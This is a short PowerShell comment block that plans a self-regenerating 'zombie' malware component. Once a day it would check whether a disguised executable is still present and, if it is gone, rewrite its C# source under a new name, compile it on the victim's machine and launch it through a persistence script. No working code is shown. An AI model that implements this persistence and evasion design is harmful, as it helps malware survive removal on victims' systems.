<#

###This zombie script is a metaprogram (a program that writes other programs).
It traverses the directory of where a given file is located and recreates it in another name
(assuming that it's deleted). 


Assuming if zombie feature cannot be found online, make a custom one
Program Steps:
1) Once per day, traverse the drive of whenever sys_host_dl_v4.0.30319_64.exe is placed in
2) if there, then done
3) else, have the contents of sys_host_dl_v4.0.30319_64.cs stored in a string
4) that content of that string is written into a .cs file (some filewriter object) with a different name (pulled from a properties/json/xml file with a listing of names)
5) that new .cs file is compiled (victim must have C# compiler installed) or this program can have the compiler packaged in (better option)
6) lastly, this new .exe file will be kicked off by persistence.ps1 file

#>